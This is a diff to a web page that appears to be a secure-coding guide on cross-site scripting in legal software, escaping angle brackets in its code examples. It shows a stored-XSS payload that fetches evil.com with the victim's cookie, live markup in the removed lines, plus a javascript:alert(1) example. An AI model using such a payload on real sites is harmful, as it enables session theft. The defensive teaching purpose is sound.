@@ -92,13 +92,13 @@
 
     <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Malicious script is permanently stored on the target server — in a database field, comment, user profile, or document. Every user who views the page containing the stored payload executes the script.</p>
 
-    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A case note field that renders without encoding. An attacker (or compromised account) saves <code><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></code> as a matter note. Every lawyer who opens that matter has their session token exfiltrated.</p>
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A case note field that renders without encoding. An attacker (or compromised account) saves <code>&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;</code> as a matter note. Every lawyer who opens that matter has their session token exfiltrated.</p>
 
     <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Reflected XSS (Non-Persistent)</h3>
 
     <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Malicious script is reflected off the server in the immediate response — typically via a URL parameter or form submission that the server echoes back.</p>
 
-    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A search endpoint that reflects the search query in the results page: "You searched for: <code><script>...</script></code>". The attacker crafts a URL and sends it to the target (phishing email to a partner with a link to "review this urgent case").</p>
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A search endpoint that reflects the search query in the results page: "You searched for: <code>&lt;script&gt;...&lt;/script&gt;</code>". The attacker crafts a URL and sends it to the target (phishing email to a partner with a link to "review this urgent case").</p>
 
     <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">DOM-Based XSS</h3>
 
@@ -175,7 +175,7 @@
 
     <ul style="margin-bottom:1.5rem;margin-left:1.5rem;" class="list-disc space-y-2 text-base leading-relaxed text-ink-light">
         <li>Render document previews in sandboxed iframes with a different origin (<code>preview.legalapp.com</code>, not <code>app.legalapp.com</code>)</li>
-        <li>Use <code>sandbox</code> attribute on iframes: <code><iframe sandbox="allow-same-origin"></code></li>
+        <li>Use <code>sandbox</code> attribute on iframes: <code>&lt;iframe sandbox="allow-same-origin"&gt;</code></li>
         <li>Convert documents to images for preview (eliminates active content entirely)</li>
         <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Set <code>X-Content-Type-Options: nosniff</code></a> to prevent MIME-type sniffing</li>
     </ul>
@@ -205,10 +205,10 @@
                 </tr>
             </thead>
             <tbody>
-                <tr class="border-t border-rule"><td class="px-4 py-3">HTML body</td><td class="px-4 py-3">HTML entity encoding</td><td class="px-4 py-3"><code><</code> → <code>&lt;</code></td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">HTML body</td><td class="px-4 py-3">HTML entity encoding</td><td class="px-4 py-3"><code>&lt;</code> → <code>&lt;</code></td></tr>
                 <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">HTML attribute</td><td class="px-4 py-3">Attribute encoding (quote all values)</td><td class="px-4 py-3"><code>"</code> → <code>&quot;</code></td></tr>
                 <tr class="border-t border-rule"><td class="px-4 py-3">JavaScript string</td><td class="px-4 py-3">JavaScript escape</td><td class="px-4 py-3"><code>'</code> → <code>\'</code>, or JSON.stringify</td></tr>
-                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">URL parameter</td><td class="px-4 py-3">URL/percent encoding</td><td class="px-4 py-3"><code><</code> → <code>%3C</code></td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">URL parameter</td><td class="px-4 py-3">URL/percent encoding</td><td class="px-4 py-3"><code>&lt;</code> → <code>%3C</code></td></tr>
                 <tr class="border-t border-rule"><td class="px-4 py-3">CSS value</td><td class="px-4 py-3">CSS escape</td><td class="px-4 py-3"><code>(</code> → <code>\28</code></td></tr>
             </tbody>
         </table>
@@ -233,8 +233,8 @@
             </thead>
             <tbody>
                 <tr class="border-t border-rule"><td class="px-4 py-3">Raw HTML insertion</td><td class="px-4 py-3">React: <code>dangerouslySetInnerHTML</code>; Vue: <code>v-html</code></td><td class="px-4 py-3">Renders unsanitised HTML directly</td></tr>
-                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3"><code>href</code> and <code>src</code> attributes</td><td class="px-4 py-3"><code><a href={userInput}></code></td><td class="px-4 py-3"><code>javascript:alert(1)</code> executes on click</td></tr>
-                <tr class="border-t border-rule"><td class="px-4 py-3">Event handlers</td><td class="px-4 py-3"><code><div onClick={...}></code> with user data</td><td class="px-4 py-3">Arbitrary code execution</td></tr>
+                <tr class="border-t border-rule bg-paper"><td class="px-4 py-3"><code>href</code> and <code>src</code> attributes</td><td class="px-4 py-3"><code>&lt;a href={userInput}&gt;</code></td><td class="px-4 py-3"><code>javascript:alert(1)</code> executes on click</td></tr>
+                <tr class="border-t border-rule"><td class="px-4 py-3">Event handlers</td><td class="px-4 py-3"><code>&lt;div onClick={...}&gt;</code> with user data</td><td class="px-4 py-3">Arbitrary code execution</td></tr>
                 <tr class="border-t border-rule bg-paper"><td class="px-4 py-3">Server-side rendering (SSR)</td><td class="px-4 py-3">Hydration mismatches</td><td class="px-4 py-3">Client renders differently than server</td></tr>
                 <tr class="border-t border-rule"><td class="px-4 py-3">Template literals</td><td class="px-4 py-3">`<code> </code><div>${userInput}</div><code> </code>`</td><td class="px-4 py-3">No escaping in template strings</td></tr>
             </tbody>
